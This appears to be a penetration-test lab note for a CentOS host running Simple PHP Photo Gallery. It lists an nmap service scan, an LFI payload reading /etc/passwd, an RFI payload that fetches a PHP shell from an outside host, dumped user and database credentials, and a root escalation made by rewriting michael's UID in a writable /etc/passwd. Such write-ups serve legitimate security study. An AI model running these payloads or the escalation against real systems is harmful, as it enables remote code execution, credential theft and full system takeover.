# Box IP: 192.168.244.58

---

## System Info
- **OS/Tech:** CentOS 7, Apache 2.4.6 (httpd), PHP 5.4.16  
- **App:** Simple PHP Photo Gallery v0.8

---

## Credentials
- **User:** `michael`  
- **Password:** `HockSydneyCertify123`

---

##  Service Enumeration (`nmap -sC -sV`)
| Port    | State | Service          | Version / Notes                              |
| ------- | ----- | ---------------- | --------------------------------------------- |
| **21**  | open  | ftp              | vsftpd 3.0.2 – anonymous YES (no interesting files) |
| **22**  | open  | ssh              | OpenSSH 7.4                                   |
| **80**  | open  | http             | Apache 2.4.6 + PHP 5.4.16                     |
| **111** | open  | rpcbind          | RPC #100000 (no RCP creds known)              |
| **139** | open  | netbios-ssn      | Samba smbd 3.x–4.x (enum4linux → users)       |
| **445** | open  | netbios-ssn      | Samba smbd (same workgroup)                  |
| **3306**| open  | mysql            | MySQL (no anonymous access)                   |
| **33060**|open  | mysqlx           | MySQL X Protocol                             |

---

##  Exploits & Findings

### 1. LFI
```text
http://192.168.244.58/image.php?img=../../../etc/passwd%00
```
michael	1000	1000	/home/michael	/bin/bash 

### 2.RFI
http://192.168.244.58/image.php?img=http://192.168.45.183/shell.php

### 3. Database Credentials 
SELECT * FROM users;
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+

-- DB password: MalapropDoffUtilize1337

etc/passwd is writable by michael....

cp /etc/passwd /tmp/passwd.bak
sed -i 's/^michael:x:1000:1000:/michael:x:0:0:/' /etc/passwd
grep '^michael:' /etc/passwd
su  michael
whoami  # → root


